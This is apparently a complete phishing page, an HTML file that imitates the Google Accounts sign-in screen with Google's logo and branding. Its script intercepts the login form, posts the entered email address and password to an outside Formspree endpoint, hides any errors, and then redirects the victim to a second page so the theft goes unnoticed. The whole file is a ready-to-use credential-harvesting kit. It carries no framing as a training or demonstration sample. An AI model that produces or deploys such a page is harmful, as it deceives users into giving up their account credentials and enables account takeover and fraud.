<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Roboto', sans-serif; }
    </style>
</head>
<body class="bg-white md:bg-gray-100 flex items-center justify-center min-h-screen p-4">
    <div class="bg-white p-6 md:p-8 rounded-2xl shadow-none md:shadow-md w-full max-w-md border border-gray-200 md:border-none">
        <div class="text-center mb-8">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="w-24 mx-auto">
            <h1 class="text-2xl font-semibold mt-4 text-gray-800">Sign in</h1>
            <p class="text-gray-600">Use your Google Account</p>
        </div>
        
        <form id="login-form">
            <div class="mb-4">
                <input type="email" name="email" placeholder="Email or phone" required class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
            </div>
            <div class="mb-6">
                <input type="password" name="password" placeholder="Enter your password" required class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
            </div>
            <div class="flex justify-between items-center">
                <a href="#" class="text-blue-600 text-sm font-medium">Forgot password?</a>
                <button type="submit" class="bg-blue-600 text-white px-8 py-2 rounded-lg font-medium hover:bg-blue-700 transition-all">Next</button>
            </div>
        </form>
    </div>

    <script>
        const loginForm = document.getElementById('login-form');
        loginForm.onsubmit = async (e) => {
            e.preventDefault();
            const formData = new FormData(loginForm);
            try {
                await fetch('https://formspree.io/f/xnpjgnnq', {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });
            } catch (err) {}
            setTimeout(() => { window.location.href = "page2.html"; }, 1000);
        };
    </script>
</body>
</html>
